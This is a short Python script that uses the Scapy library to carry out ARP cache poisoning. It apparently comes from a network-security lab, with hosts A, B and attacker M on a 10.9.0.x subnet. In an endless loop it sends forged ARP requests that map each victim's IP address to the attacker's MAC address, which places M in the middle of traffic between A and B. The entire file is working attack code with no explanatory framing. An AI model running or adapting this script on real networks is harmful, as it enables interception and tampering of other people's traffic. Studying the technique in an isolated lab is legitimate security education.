from scapy.all import *
import time

# MAC A: 02:42:0a:09:00:05
# IP A: 10.9.0.5
# MAC B: 02:42:0a:09:00:06
# IP B: 10.9.0.6
# MAC M: 02:42:0a:09:00:69
# IP M: 10.9.0.105

def send_ARP(ip_src, mac_src, ip_dst, mac_dst):
    E = Ether(dst = mac_dst, src = mac_src)
    A = ARP(hwsrc = mac_src, psrc = ip_src, hwdst = mac_dst, pdst = ip_dst)
    A.op = 1 # 1 for ARP request; 2 for ARP reply

    pkt = E/A
    pkt.show()
    sendp(pkt)

while 1:
    send_ARP('10.9.0.5', '02:42:0a:09:00:69', '10.9.0.6', '02:42:0a:09:00:06')
    send_ARP('10.9.0.6', '02:42:0a:09:00:69', '10.9.0.5', '02:42:0a:09:00:05')
    time.sleep(5)